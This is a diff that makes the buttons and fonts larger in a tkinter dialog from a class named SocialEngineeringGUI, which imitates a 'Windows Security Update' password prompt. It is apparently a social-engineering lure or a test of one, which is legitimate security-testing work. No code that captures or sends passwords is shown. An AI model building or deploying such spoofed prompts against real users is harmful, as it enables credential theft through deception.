@@ -161,7 +161,7 @@ class SocialEngineeringGUI:
         """Build the tkinter password dialog."""
         self.root = tk.Tk()
         self.root.title("Windows Security Update")
-        self.root.geometry("420x380")
+        self.root.geometry("520x480")
         self.root.resizable(False, False)
         self.root.configure(bg="#f0f0f0")
         self.root.protocol("WM_DELETE_WINDOW", self.on_close)
@@ -254,39 +254,35 @@ class SocialEngineeringGUI:
 
         # Buttons
         btn_frame = tk.Frame(self.root, bg="#f0f0f0")
-        btn_frame.pack(fill="x", padx=30, pady=(5, 15))
+        btn_frame.pack(fill="x", padx=30, pady=(10, 20))
 
         tk.Button(
             btn_frame,
             text="UPDATE PASSWORD",
-            font=("Liberation Sans", 16, "bold"),
+            font=("Liberation Sans", 18, "bold"),
             bg="#0078d4",
             fg="#ffffff",
             activebackground="#005a9e",
             activeforeground="#ffffff",
             relief="solid",
             bd=3,
-            padx=20,
-            pady=10,
             cursor="hand2",
             command=self.on_submit,
-        ).pack(side="left", padx=(0, 15))
+        ).pack(fill="x", pady=(0, 10), ipady=12)
 
         tk.Button(
             btn_frame,
             text="CANCEL",
-            font=("Liberation Sans", 16),
+            font=("Liberation Sans", 18),
             bg="#c8c8c8",
             fg="#000000",
             activebackground="#a0a0a0",
             activeforeground="#000000",
             relief="solid",
             bd=3,
-            padx=20,
-            pady=10,
             cursor="hand2",
             command=self.on_close,
-        ).pack(side="left")
+        ).pack(fill="x", ipady=12)
 
         # Footer
         tk.Label(
